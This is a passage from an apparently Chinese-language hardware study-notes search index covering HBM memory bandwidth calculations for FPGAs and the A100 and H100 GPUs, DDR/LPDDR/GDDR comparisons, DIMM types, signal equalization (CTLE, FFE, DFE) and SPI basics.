\u200b\u82af\u7247\u200b\u7684\u200b\u6570\u636e\u200b\u4f20\u8f93\u901f\u7387\u200b\u6700\u5927\u200b\u662f\u200b\uff1a</p> \\[ 3200 \\mathrm{(MT/s)} * 128 \\mathrm{(bits/transfer)} * 8 \\mathrm{(Channels)} = 3276.8 \\mathrm{(Gb/s)} = 409.6 \\mathrm{(GB/s)} \\] <p>\u200b\u6240\u4ee5\u200b\u4e00\u7247\u200b HBM \u200b\u7684\u200b\u4f20\u8f93\u901f\u7387\u200b\u5c31\u200b\u76f8\u5f53\u4e8e\u200b 16 \u200b\u4e2a\u200b\u4f20\u7edf\u200b\u7684\u200b DDR SDRAM\uff0c\u200b\u9760\u200b\u7684\u200b\u662f\u200b 8 \u200b\u4e2a\u200b Channel \u200b\u4ee5\u53ca\u200b\u53cc\u500d\u200b\u7684\u200b\u4f4d\u200b\u5bbd\u200b\u3002\u200b\u6bcf\u4e2a\u200b Channel \u200b\u7684\u200b\u4f4d\u200b\u5bbd\u200b\u662f\u200b 128 \u200b\u4f4d\u200b\uff0c\u200b\u5b9e\u9645\u4e0a\u200b\u53ef\u4ee5\u200b\u8ba4\u4e3a\u200b\u662f\u200b\u628a\u200b\u4e24\u7247\u200b 64-bit SDRAM \u200b\u5e76\u200b\u8d77\u6765\u200b\u4e86\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5f53\u6210\u200b\u4e00\u4e2a\u200b 128 \u200b\u4f4d\u200b\u7684\u200b\u7528\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5728\u200b Pseudo Channel \u200b\u6a21\u5f0f\u200b\u4e0b\u200b\uff0c\u200b\u5f53\u6210\u200b\u5171\u4eab\u200b\u5730\u5740\u200b\u548c\u200b\u547d\u4ee4\u200b\u4fe1\u53f7\u200b\u7684\u200b\u4e24\u4e2a\u200b SDRAM \u200b\u7528\u200b\u3002</p> <p>\u200b\u5f53\u7136\u200b\u4e86\u200b\uff0cHBM \u200b\u7684\u200b\u9ad8\u5e26\u5bbd\u200b\u7684\u200b\u4ee3\u4ef7\u200b\u5c31\u662f\u200b\u5f15\u811a\u200b\u6570\u91cf\u200b\u5f88\u591a\u200b\u3002\u200b\u6839\u636e\u200b HBM3 JESD238A \u200b\u6807\u51c6\u200b\uff0c\u200b\u6bcf\u4e2a\u200b Channel \u200b\u8981\u200b 120 \u200b\u4e2a\u200b pin\uff0c\u200b\u4e00\u5171\u200b 16 \u200b\u4e2a\u200b channel\uff08HBM2 \u200b\u662f\u200b 8 channel\uff0c\u200b\u6bcf\u4e2a\u200b channel 128 \u200b\u4f4d\u200b\uff1bHBM3 \u200b\u662f\u200b 16 channel\uff0c\u200b\u6bcf\u4e2a\u200b channel 64 \u200b\u4f4d\u200b\uff09\uff0c\u200b\u52a0\u4e0a\u200b\u5176\u4f59\u200b\u7684\u200b 52 \u200b\u4e2a\u200b pin\uff0c\u200b\u8fd9\u4e9b\u200b\u52a0\u200b\u8d77\u6765\u200b\u5c31\u200b 1972 \u200b\u4e2a\u200b pin \u200b\u4e86\u200b\u3002\u200b\u6240\u4ee5\u200b\u4e00\u822c\u200b\u5728\u200b Silicon Interposer \u200b\u4e0a\u200b\u4e0e\u200b\u5904\u7406\u5668\u200b\u8fde\u63a5\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u4f20\u7edf\u200b\u7684\u200b\u5728\u200b PCB \u200b\u4e0a\u200b\u8d70\u7ebf\u200b\uff1a</p> <p> </p> HBM \u200b\u7684\u200b\u5c01\u88c5\u200b\u5f62\u5f0f\u200b\uff08\u200b\u56fe\u6e90\u200b A 1.2V 20nm 307GB/s HBM DRAM with At-Speed Wafer-Level I/O Test Scheme and Adaptive Refresh Considering Temperature Distribution\uff09 <p>\u200b\u6240\u4ee5\u200b\u5728\u200b HBM3 \u200b\u6807\u51c6\u200b\u91cc\u200b\uff0c\u200b\u7528\u200b Microbump \u200b\u6765\u200b\u63cf\u8ff0\u200b HBM \u200b\u7684\u200b pin\u3002\u200b\u53ef\u4ee5\u200b\u5f62\u8c61\u200b\u5730\u200b\u7406\u89e3\u200b\u4e3a\u200b\uff0c\u200b\u628a\u200b\u539f\u6765\u200b\u63d2\u200b\u5728\u200b\u4e3b\u677f\u200b\u4e0a\u200b\u7684\u200b\u5185\u5b58\u6761\u200b\u62c6\u5f00\u200b\uff0c\u200b\u53ea\u200b\u4fdd\u7559\u200b\u82af\u7247\u200b\uff0c\u200b\u628a\u200b\u82af\u7247\u200b\u7ad6\u76f4\u200b\u5806\u53e0\u200b\u8d77\u6765\u200b\uff0c\u200b\u53d8\u6210\u200b\u4e00\u4e2a\u200b HBM Die\uff0c\u200b\u7136\u540e\u200b\u7d27\u5bc6\u200b\u5730\u200b\u8fde\u63a5\u200b\u5230\u200b CPU \u200b\u4e2d\u200b\u3002\u200b\u4f46\u662f\u200b\u53e6\u4e00\u65b9\u9762\u200b\uff0c\u200b\u5bc6\u5ea6\u200b\u4e0a\u53bb\u200b\u4e86\u200b\uff0c\u200b\u4ef7\u683c\u200b\u4e5f\u200b\u66f4\u200b\u8d35\u200b\u4e86\u200b\u3002\u200b\u540c\u65f6\u200b\u6269\u5c55\u6027\u200b\u4e5f\u200b\u4e0b\u964d\u200b\u4e86\u200b\uff0c\u200b\u4e0d\u80fd\u200b\u50cf\u200b DDR SDRAM \u200b\u90a3\u6837\u200b\u5728\u200b\u4e3b\u677f\u200b\u4e0a\u200b\u63d2\u200b\u5f88\u591a\u200b\u6761\u200b\u3002</p> <p>\u200b\u4e0b\u9762\u200b\u6765\u200b\u5206\u6790\u200b\u4e00\u4e9b\u200b\u5178\u578b\u200b\u7684\u200b\u5e26\u6709\u200b HBM \u200b\u7684\u200b\u7cfb\u7edf\u200b\u7684\u200b\u5185\u5b58\u200b\u5e26\u5bbd\u200b\uff1a</p> <p>Xilinx \u200b\u7684\u200b Virtex Ultrascale Plus HBM FPGA \u200b\u63d0\u4f9b\u200b\u4e86\u200b \\(1800 \\mathrm{(MT/s)} * 128 \\mathrm{(bits/transfer)} * 8 \\mathrm{(Channels)} = 230.4 \\mathrm{(GB/s)}\\) \u200b\u7684\u200b\u5e26\u5bbd\u200b\uff0c\u200b\u5982\u679c\u200b\u7528\u200b\u4e86\u200b\u4e24\u7247\u200b HBM \u200b\u5c31\u662f\u200b 460.8 GB/s\u3002\u200b\u66b4\u9732\u200b\u7ed9\u200b FPGA \u200b\u903b\u8f91\u200b\u7684\u200b\u662f\u200b 16 \u200b\u4e2a\u200b 256 \u200b\u4f4d\u200b\u7684\u200b AXI3 \u200b\u7aef\u53e3\u200b\uff0cAXI \u200b\u9891\u7387\u200b 450 MHz\uff0c\u200b\u5185\u5b58\u200b\u9891\u7387\u200b 900 MHz\u3002\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u6bcf\u4e2a\u200b AXI3 \u200b\u5c31\u200b\u5bf9\u5e94\u200b\u4e86\u200b\u4e00\u4e2a\u200b HBM \u200b\u7684\u200b pseudo channel\u3002\u200b\u6bcf\u4e2a\u200b pseudo channel \u200b\u662f\u200b 64 \u200b\u4f4d\u200b\uff0c\u200b\u4f46\u662f\u200b AXI \u200b\u7aef\u53e3\u200b\u662f\u200b 256 \u200b\u4f4d\u200b\uff0c\u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b\u5728\u200b\u901f\u7387\u200b\u4e0d\u53d8\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u4ece\u200b 450MHz \u200b\u5230\u200b 900MHz\uff0c\u200b\u518d\u200b\u52a0\u4e0a\u200b DDR\uff0c\u200b\u7b49\u4ef7\u200b\u4e8e\u200b\u9891\u7387\u200b\u7ffb\u200b\u4e86\u200b\u56db\u500d\u200b\uff0c\u200b\u6240\u4ee5\u200b\u4f4d\u200b\u5bbd\u200b\u4e5f\u200b\u8981\u200b\u76f8\u5e94\u200b\u5730\u200b\u4ece\u200b 64 \u200b\u4f4d\u7ffb\u200b\u56db\u500d\u200b\u5230\u200b 256 \u200b\u4f4d\u200b\u3002</p> <p>A100 \u200b\u663e\u5361\u200b 40GB PCIe \u200b\u7248\u672c\u200b\u91c7\u7528\u200b\u4e86\u200b 5 \u200b\u4e2a\u200b 8 GB \u200b\u7684\u200b HBM \u200b\u5185\u5b58\u200b\uff0c\u200b\u8fd0\u884c\u200b\u5728\u200b 1215 MHz \u200b\u7684\u200b\u9891\u7387\u200b\u4e0b\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5185\u5b58\u200b\u5e26\u5bbd\u200b\u5c31\u662f\u200b \\(1215 \\mathrm{(MHz)} * 2 \\mathrm{(DDR)} * 8 \\mathrm{(channels)} * 128 \\mathrm{(bits/transfer)} / 8 \\mathrm{(bits/byte)} * 5 \\mathrm{(HBM)} = 1555 \\mathrm{(GB/s)}\\)\uff0c\u200b\u4e0e\u200b Datasheet \u200b\u543b\u5408\u200b\u3002A100 Datasheet \u200b\u4e2d\u200b\u7684\u200b Memory bus width \u200b\u7684\u200b\u8ba1\u7b97\u200b\u65b9\u5f0f\u200b\u5176\u5b9e\u200b\u5c31\u662f\u200b\u628a\u200b\u6240\u6709\u200b\u7684\u200b Channel \u200b\u4f4d\u5bbd\u52a0\u200b\u8d77\u6765\u200b\uff1a\\(128 \\mathrm{(bits/transfer)} * 8 \\mathrm{(channels)} * 5 \\mathrm{(stacks)} = 5120 \\mathrm{(bits)}\\)\u3002</p> <p>A100 \u200b\u663e\u5361\u200b 80GB PCIe \u200b\u7248\u672c\u200b\u628a\u200b HBM2 \u200b\u5347\u7ea7\u200b\u5230\u200b\u4e86\u200b HBM2e\uff0c\u200b\u540c\u65f6\u200b\u5185\u5b58\u200b\u65f6\u949f\u200b\u9891\u7387\u200b\u4e5f\u200b\u5347\u7ea7\u200b\u5230\u200b\u4e86\u200b 1512 MHz\uff0c\u200b\u6b64\u65f6\u200b\u5185\u5b58\u200b\u5e26\u5bbd\u200b\u5c31\u662f\u200b \\(1512 \\mathrm{(MHz)} * 2 \\mathrm{(DDR)} * 8 \\mathrm{(channels)} * 128 \\mathrm{(bits/transfer)} / 8 \\mathrm{(bits/byte)} * 5 \\mathrm{(HBM)} = 1935 \\mathrm{(GB/s)}\\)\uff0c\u200b\u4e0e\u200b Datasheet \u200b\u543b\u5408\u200b\u3002</p> <p>H100 \u200b\u663e\u5361\u200b 80GB SXM5 \u200b\u7248\u672c\u200b\u628a\u200b HBM \u200b\u5347\u7ea7\u200b\u5230\u200b\u4e86\u200b HBM3\uff0c\u200b\u5185\u5b58\u5bb9\u91cf\u200b\u4f9d\u7136\u200b\u662f\u200b 80GB\uff0c\u200b\u4f46\u662f\u200b\u65f6\u949f\u200b\u9891\u7387\u200b\u63d0\u9ad8\u200b\u5230\u200b\u4e86\u200b 2619 MHz\uff0c\u200b\u6b64\u65f6\u200b\uff0c\u200b\u5185\u5b58\u200b\u5e26\u5bbd\u200b\u662f\u200b \\(2619 \\mathrm{(MHz)} * 2 \\mathrm{(DDR)} * 8 \\mathrm{(channels)} * 128 \\mathrm{(bits/transfer)} / 8 \\mathrm{(bits/byte)} * 5 \\mathrm{(HBM)} = 3352 \\mathrm{(GB/s)}\\)\u3002</p>"},{"location":"hardware/sdram.html#dram-cell","title":"DRAM Cell","text":"<p>DRAM \u200b\u7684\u200b\u6570\u636e\u200b\u5b58\u50a8\u200b\u5728\u200b\u7535\u5bb9\u200b\u4e2d\u200b\u3002\u200b\u5178\u578b\u200b\u7684\u200b 1T DRAM Cell \u200b\u5185\u90e8\u200b\u6784\u9020\u200b\u5982\u4e0b\u200b\uff1a</p> <p> </p> 1T DRAM Cell \u200b\u5185\u90e8\u200b\u6784\u9020\u200b\uff08\u200b\u56fe\u6e90\u200b Berkeley EECS 151/251A Spring 2019\uff09"},{"location":"hardware/sdram.html#ddr","title":"\u51e0\u79cd\u200b DDR \u200b\u7684\u200b\u5bf9\u6bd4","text":"<p>\u200b\u4e0b\u9762\u200b\u7ed9\u51fa\u200b DDR\uff0cLPDDR\uff0cGDDR \u200b\u548c\u200b HBM \u200b\u7684\u200b\u5bf9\u6bd4\u200b\uff1a</p> DDR4 DDR5 LPDDR4 LPDDR5 GDDR5 GDDR6 HBM2 Channel \u200b\u6570\u91cf\u200b 1 2 2 2 2 2 8 \u200b\u6bcf\u200b Channel \u200b\u4f4d\u200b\u5bbd\u200b 64 32 16 16/32 16 16 128 \u200b\u6570\u636e\u200b\u901f\u7387\u200b\uff08MT/s\uff09 3200 5600 4266 6400 9000 24000 2400 \u200b\u603b\u200b\u5e26\u5bbd\u200b\uff08GB/s\uff09 25.6 GB/s 44.8 GB/s 17.1 GB/s 25.6 GB/s 36 GB/s 96 GB/s 307 GB/s <p>\u200b\u6570\u636e\u200b\u901f\u7387\u200b\u6309\u7167\u200b\u80fd\u67e5\u200b\u5230\u200b\u7684\u200b\u578b\u53f7\u200b\u7684\u200b\u6700\u9ad8\u200b\u6027\u80fd\u200b\uff1a</p> <ul> <li>DDR4: Micron 3200 MT/s</li> <li>DDR5: Micron 5600 MT/s</li> <li>LPDDR4: Samsung 4266 MT/s</li> <li>LPDDR5: Samsung 6400 MT/s</li> <li>GDDR5: Samsung 9000 MT/s</li> <li>GDDR6: Samsung 24000 MT/s</li> <li>HBM2: Samsung 2400 MT/s</li> <li>HBM2E: Micron 3200 MT/s</li> </ul>"},{"location":"hardware/sdram.html#udimmrdimmlrdimm","title":"UDIMM/RDIMM/LRDIMM","text":"<p>\u200b\u5177\u4f53\u200b\u5230\u200b DIMM\uff0c\u200b\u53c8\u200b\u6709\u200b\u4e0d\u540c\u200b\u7684\u200b\u7c7b\u578b\u200b\uff1a</p> <ul> <li>UDIMM(Unbuffered DIMM): \u200b\u6ca1\u6709\u200b\u989d\u5916\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u6253\u200b\u62cd\u200b</li> <li>RDIMM(Registered DIMM): \u200b\u5bf9\u200b\u5730\u5740\u200b\u3001\u200b\u547d\u4ee4\u200b\u548c\u200b\u65f6\u949f\u200b\u4fe1\u53f7\u200b\u52a0\u200b\u5bc4\u5b58\u5668\u200b\u6253\u200b\u62cd\u200b\uff0c\u200b\u6570\u636e\u4fe1\u53f7\u200b\u4e0d\u200b\u52a0\u200b\u5bc4\u5b58\u5668\u200b</li> <li>LRDIMM(Load Reduced DIMM): \u200b\u5728\u200b RDIMM \u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u7ed9\u200b\u6570\u636e\u4fe1\u53f7\u200b\u4e5f\u200b\u52a0\u4e0a\u200b\u5bc4\u5b58\u5668\u200b</li> </ul> <p>\u200b\u968f\u7740\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u589e\u52a0\u200b\uff0c\u200b\u5ef6\u8fdf\u200b\u589e\u52a0\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e5f\u200b\u80fd\u200b\u8fbe\u5230\u200b\u66f4\u200b\u9ad8\u200b\u7684\u200b\u9891\u7387\u200b\uff0c\u200b\u66f4\u5927\u200b\u7684\u200b\u5bb9\u91cf\u200b\u3002</p>"},{"location":"hardware/sdram.html#ddr5-dfe","title":"DDR5 DFE","text":"<p>DDR5 \u200b\u5f15\u5165\u200b\u4e86\u200b DFE \u200b\u6765\u200b\u6539\u8fdb\u200b\u4fe1\u53f7\u200b\u5b8c\u6574\u6027\u200b\u3002\u200b\u5173\u4e8e\u200b DFE\uff0c\u200b\u8be6\u89c1\u200b \u200b\u4fe1\u53f7\u5904\u7406\u200b \u200b\u4e2d\u200b\u7684\u200b\u4ecb\u7ecd\u200b\u3002</p> <p>DDR5 \u200b\u652f\u6301\u200b 4-Tap DFE\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u8003\u8651\u200b\u7684\u200b\u662f\u200b\u6700\u8fd1\u200b\u56db\u4e2a\u200b\u7b26\u53f7\u200b\u5bf9\u200b\u5f53\u524d\u200b\u7b26\u53f7\u200b\u5e26\u6765\u200b\u7684\u200b\u5e72\u6270\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u56db\u4e2a\u200b\u7cfb\u6570\u200b\u3002\u200b\u4e3a\u4e86\u200b\u6d4b\u91cf\u200b\u51fa\u200b\u8fd9\u200b\u56db\u4e2a\u200b\u7cfb\u6570\u200b\uff0c\u200b\u5728\u200b\u8bad\u7ec3\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9996\u5148\u200b\u53d1\u51fa\u200b\u4e00\u4e2a\u200b\u8109\u51b2\u200b\uff0c\u200b\u7136\u540e\u200b\u89c2\u5bdf\u200b\u5b83\u200b\u7684\u200b\u54cd\u5e94\u200b\uff0c\u200b\u901a\u8fc7\u200b\u4e0d\u65ad\u200b\u8c03\u6574\u200b\u7cfb\u6570\u200b\uff0c\u200b\u62b5\u6d88\u200b\u5b83\u200b\u5bf9\u200b\u540e\u7eed\u200b\u7b26\u53f7\u200b\u7684\u200b\u5e72\u6270\u200b\u3002</p> <p> </p> DDR5 DFE\uff08\u200b\u56fe\u6e90\u200b Meeting the 5 Key DDR5 Test Challenges as We Migrate to Next Gen Memory\uff09 <p> </p> DDR5 DFE\uff08\u200b\u56fe\u6e90\u200b Meeting the 5 Key DDR5 Test Challenges as We Migrate to Next Gen Memory\uff09"},{"location":"hardware/sdram.html#_11","title":"\u76f8\u5173\u200b\u9605\u8bfb","text":"<ul> <li>DDR4 Bank Groups in Embedded Applications</li> <li>DDR4 Tutorial - Understanding the Basics</li> <li>DDR5/4/3/2: How Memory Density and Speed Increased with each Generation of DDR</li> <li>DDR5 vs DDR4 DRAM \u2013 All the Advantages &amp; Design Challenges</li> <li>Understanding DDR3 Write Leveling and Read Leveling</li> <li>Will HBM replace DDR and become Computer Memory?</li> </ul>"},{"location":"hardware/signal_processing.html","title":"\u4fe1\u53f7\u5904\u7406","text":""},{"location":"hardware/signal_processing.html#pre-emphasis","title":"\u9884\u200b\u52a0\u91cd\u200b Pre-Emphasis","text":"<p>\u200b\u4fe1\u53f7\u200b\u5728\u200b\u4ecb\u8d28\u200b\u4e2d\u200b\u4f20\u64ad\u200b\u65f6\u200b\uff0c\u200b\u4e0d\u540c\u200b\u9891\u7387\u200b\u7684\u200b\u5206\u91cf\u200b\u7684\u200b\u8870\u51cf\u200b\u6bd4\u4f8b\u200b\u4e0d\u540c\u200b\uff0c\u200b\u4f8b\u5982\u200b\u9ad8\u9891\u200b\u5206\u91cf\u200b\u8870\u51cf\u200b\u8f83\u200b\u591a\u200b\uff0c\u200b\u4f4e\u9891\u200b\u5206\u91cf\u200b\u8870\u51cf\u200b\u8f83\u200b\u5c11\u200b\u3002\u200b\u4e3a\u4e86\u200b\u4fe1\u53f7\u200b\u7684\u200b\u6b63\u5e38\u200b\u4f20\u8f93\u200b\uff0c\u200b\u63a5\u8fd1\u200b\u9ad8\u9891\u200b\u5206\u91cf\u200b\u8870\u51cf\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u5728\u200b\u53d1\u9001\u200b\u7aef\u200b\u6dfb\u52a0\u200b\u4e00\u4e9b\u200b\u989d\u5916\u200b\u7684\u200b\u9ad8\u9891\u200b\u5206\u91cf\u200b\u3002</p>"},{"location":"hardware/signal_processing.html#equalization","title":"\u5747\u8861\u200b Equalization","text":"<p>\u200b\u5747\u8861\u200b\u7684\u200b\u610f\u601d\u200b\u662f\u200b\uff0c\u200b\u8ba9\u200b\u4ecb\u8d28\u200b\u5bf9\u200b\u4e0d\u540c\u200b\u9891\u7387\u200b\u5206\u91cf\u200b\u7684\u200b\u8870\u51cf\u200b\u5747\u8861\u200b\u3002</p>"},{"location":"hardware/signal_processing.html#ctle-continuous-time-linear-equalization","title":"CTLE Continuous-Time Linear Equalization","text":"<p>\u200b\u5728\u200b\u9891\u57df\u200b\u6a21\u62df\u4fe1\u53f7\u200b\u4e0a\u200b\u5de5\u4f5c\u200b\uff0c\u200b\u9ad8\u901a\u200b\u6ee4\u6ce2\u5668\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7531\u200b RLC \u200b\u7535\u8def\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u7ebf\u6027\u200b\u3002</p> <p> </p> CTLE\uff08\u200b\u56fe\u6e90\u200b https://people.engr.tamu.edu/spalermo/ecen689/lecture18_ee689_rx_fir_ctle_eq.pdf\uff09"},{"location":"hardware/signal_processing.html#ffe-feed-forward-equalization","title":"FFE Feed-Forward Equalization","text":"<p>\u200b\u5728\u200b\u65f6\u57df\u200b\u6570\u5b57\u4fe1\u53f7\u200b\u4e0a\u200b\u5de5\u4f5c\u200b\uff0c\u200b\u7b49\u4ef7\u200b\u4e8e\u200b\u4e00\u4e2a\u200b Finite Impulse Response (FIR)\uff0c\u200b\u76f8\u5f53\u4e8e\u200b\u628a\u200b\u4e00\u4e2a\u200b\u65b9\u6ce2\u200b\u5206\u89e3\u6210\u200b\u51e0\u4e2a\u200b\u5c0f\u200b\u7684\u200b\u65b9\u6ce2\u200b\uff0c\u200b\u7ebf\u6027\u200b\u3002</p> <p> </p> FFE\uff08\u200b\u56fe\u6e90\u200b https://people.engr.tamu.edu/spalermo/ecen689/lecture18_ee689_rx_fir_ctle_eq.pdf\uff09"},{"location":"hardware/signal_processing.html#dfe-decision-feedback-equalization","title":"DFE Decision-Feedback Equalization","text":"<p>\u200b\u5728\u200b\u65f6\u57df\u200b\u6570\u5b57\u4fe1\u53f7\u200b\u4e0a\u200b\u5de5\u4f5c\u200b\uff0c\u200b\u4ece\u200b\u4fe1\u53f7\u200b\u89e3\u6790\u200b\u51fa\u662f\u200b\u5f53\u524d\u200b\u4f20\u8f93\u200b\u7684\u200b\u662f\u200b\u4ec0\u4e48\u200b\u7b26\u53f7\u200b\u540e\u200b\uff0c\u200b\u6839\u636e\u200b\u8be5\u200b\u7b26\u53f7\u200b\u751f\u6210\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u6765\u200b\u62b5\u6d88\u200b\u8be5\u200b\u7b26\u53f7\u200b\u5bf9\u200b\u540e\u7eed\u200b\u7b26\u53f7\u200b\u7684\u200b\u5e72\u6270\u200b\uff0c\u200b\u975e\u7ebf\u6027\u200b\uff08\u200b\u56e0\u4e3a\u200b\u4ece\u200b\u4fe1\u53f7\u200b\u5224\u65ad\u200b\u7b26\u53f7\u200b\u662f\u200b\u975e\u7ebf\u6027\u200b\u7684\u200b\uff09\u3002</p> <p>\u200b\u5047\u5982\u200b\u5148\u200b\u4f20\u8f93\u200b\u7b26\u53f7\u200b A\uff0c\u200b\u518d\u200b\u4f20\u8f93\u200b\u7b26\u53f7\u200b B\uff0c\u200b\u90a3\u4e48\u200b A \u200b\u4f1a\u200b\u7ed9\u200b B \u200b\u5e26\u6765\u200b\u5e72\u6270\u200b\u3002\u200b\u5728\u200b\u63a5\u6536\u200b\u5230\u200b B \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5df2\u7ecf\u200b\u77e5\u9053\u200b A \u200b\u662f\u200b\u4ec0\u4e48\u200b\u4e86\u200b\u3002\u200b\u4e3a\u4e86\u200b\u80fd\u591f\u200b\u6b63\u786e\u200b\u5730\u200b\u63a5\u6536\u200b B\uff0c\u200b\u9996\u5148\u200b\u8ba1\u7b97\u200b\u51fa\u200b A \u200b\u5bf9\u200b B \u200b\u7684\u200b\u5e72\u6270\u200b\uff0c\u200b\u53bb\u6389\u200b\u8fd9\u4e2a\u200b\u5e72\u6270\u200b\uff0c\u200b\u518d\u200b\u5224\u65ad\u200b B \u200b\u662f\u200b\u4ec0\u4e48\u200b\u3002\u200b\u66f4\u8fdb\u4e00\u6b65\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u7b26\u53f7\u200b\u53ef\u80fd\u200b\u5bf9\u200b\u540e\u7eed\u200b\u7684\u200b\u591a\u4e2a\u200b\u7b26\u53f7\u200b\u5e26\u6765\u200b\u5e72\u6270\u200b\uff0c\u200b\u90a3\u4e48\u200b\u53ef\u4ee5\u200b\u7528\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u65b9\u6cd5\u200b\u6765\u200b\u53bb\u6389\u200b\u524d\u200b\u82e5\u5e72\u4e2a\u200b\u7b26\u53f7\u200b\u5bf9\u200b\u5f53\u524d\u200b\u7b26\u53f7\u200b\u7684\u200b\u5e72\u6270\u200b\u3002</p> <p> </p> DFE\uff08\u200b\u56fe\u6e90\u200b https://docs.keysight.com/eesofapps/post-8-eye-opening-experience-with-dfe-678068404.html\uff09 <p> </p> DFE\uff08\u200b\u56fe\u6e90\u200b http://www.seas.ucla.edu/brweb/papers/Journals/BRFall17DFE.pdf\uff09"},{"location":"hardware/signal_processing.html#_2","title":"\u53c2\u8003","text":"<ul> <li>\u200b\u9884\u200b\u52a0\u91cd\u200b\u3001\u200b\u53bb\u200b\u52a0\u91cd\u200b\u548c\u200b\u5747\u8861\u200b</li> <li>Emphasis (telecommunications)</li> <li>Transmitter Pre-Emphasis and Receiver Equalization</li> <li>Post 6: Eye-opening Experience with CTLE</li> <li>Post 7: Eye-opening Experience with FFE</li> <li>Post 8: Eye-opening Experience with DFE</li> <li>RX FIR &amp; CTLE Equalization</li> <li>ECEN 689 High-Speed Links Circuits and Systems Lab5 Equalization Circuits</li> <li>The Decision-Feedback Equalizer</li> </ul>"},{"location":"hardware/spi.html","title":"SPI (Serial Peripheral Interface)","text":""},{"location":"hardware/spi.html#_1","title":"\u63a5\u53e3","text":"<p>SPI \u200b\u534f\u8bae\u200b\u6d89\u53ca\u200b\u5230\u200b\u56db\u4e2a\u200b\u4fe1\u53f7\u200b\uff1a</p> <ul> <li>SCLK: \u200b\u65f6\u949f\u200b\u4fe1\u53f7\u200b\uff0cMaster -&gt; Slave</li> <li>MOSI\uff1a\u200b\u6570\u636e\u4fe1\u53f7\u200b\uff0cMaster -&gt; Slave</li> <li>MISO\uff1a\u200b\u6570\u636e\u4fe1\u53f7\u200b\uff0cSlave -&gt; Master</li> <li>CS\uff1a\u200b\u82af\u7247\u200b\u4f7f\u80fd\u200b\uff0c\u200b\u4e00\u822c\u200b\u662f\u200b\u4f4e\u200b\u6709\u6548\u200b</li> </ul> <p>\u200b\u8981\u200b\u901a\u8fc7\u200b SPI \u200b\u534f\u8bae\u200b\u53d1\u9001\u200b\u547d\u4ee4\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u901a\u5e38\u200b\u9700\u8981\u200b\u5148\u62c9\u4f4e\u200b CS\uff0c\u200b\u7136\u540e\u200b\u542f\u52a8\u200b SCLK \u200b\u65f6\u949f\u200b\uff0c\u200b\u540c\u65f6\u200b\u6536\u53d1\u200b\u6570\u636e\u200b\u3002\u200b\u6ce8\u610f\u200b SPI \u200b\u662f\u200b\u5168\u53cc\u5de5\u200b\u7684\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u53d1\u9001\u200b\u7684\u200b\u540c\u65f6\u200b\u4e5f\u200b\u5728\u200b\u63a5\u6536\u200b\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u901a\u5e38\u200b\u6765\u8bf4\u200b\uff0c\u200b\u5916\u8bbe\u200b\u7b49\u5230\u200b\u4e3b\u673a\u200b\u53d1\u9001\u200b\u4e86\u200b\u547d\u4ee4\u200b\u672c\u8eab\u200b\uff0c\u200b\u624d\u200b\u77e5\u9053\u200b\u8981\u200b\u56de\u590d\u200b\u4ec0\u4e48\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5f88\u591a\u200b\u65f6\u5019\u200b\u547d\u4ee4\u200b\u8bbe\u8ba1\u200b\u6210\u200b\u4e86\u200b\u4e8b\u5b9e\u4e0a\u200b\u7684\u200b\u534a\u53cc\u5de5\u200b\uff1a\u200b\u524d\u534a\u90e8\u200b\u5206\u200b\u4e3b\u673a\u200b\u5728\u200b\u53d1\u200b\u547d\u4ee4\u200b\uff0c\u200b\u5916\u8bbe\u200b\u53d1\u9001\u200b\u65e0\u7528\u200b\u7684\u200b\u6570\u636e\u200b\uff1b\u200b\u540e\u534a\u90e8\u200b\u5206\u5916\u200b\u8bbe\u5728\u200b\u53d1\u9001\u200b\u54cd\u5e94\u200b\uff0c\u200b\u4e3b\u673a\u200b\u53d1\u9001\u200b\u65e0\u7528\u200b\u7684\u200b\u6570\u636e\u200b\u3002</p>"},{"location":"hardware/spi.html#_2","title":"\u6ce2\u5f62","text":"<p>SPI \u200b\u6709\u200b\u4e0d\u540c\u200b\u7684\u200b\u7c7b\u578b\u200b\uff0c\u200b\u4e0b\u9762\u200b\u8bb2\u200b\u4e00\u79cd\u200b\u6bd4\u8f83\u200b\u5e38\u89c1\u200b\u7684\u200b\u914d\u7f6e\u200b\uff08\u200b\u5373\u200b CPOL=0\uff0cCPHA=0\uff09\uff0c\u200b\u5728\u200b\u8fd9\u79cd\u200b\u6a21\u5f0f\u200b\u4e0b\u200b\uff0cMaster \u200b\u548c\u200b Slave \u200b\u90fd\u200b\u662f\u200b\u5728\u200b\u65f6\u949f\u200b\u7684\u200b\u4e0b\u964d\u200b\u6cbf\u200b\u4fee\u6539\u200b\u8f93\u51fa\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u7136\u540e\u200b\u5728\u200b\u65f6\u949f\u200b\uff08<code>sclk</code>\uff09\u200b\u7684\u200b\u4e0a\u5347\u200b\u6cbf\u5bf9\u200b\u63a5\u6536\u200b\u5230\u200b\u7684\u200b\u6570\u636e\u200b\u8fdb\u884c\u200b\u91c7\u6837\u200b\uff1a</p> 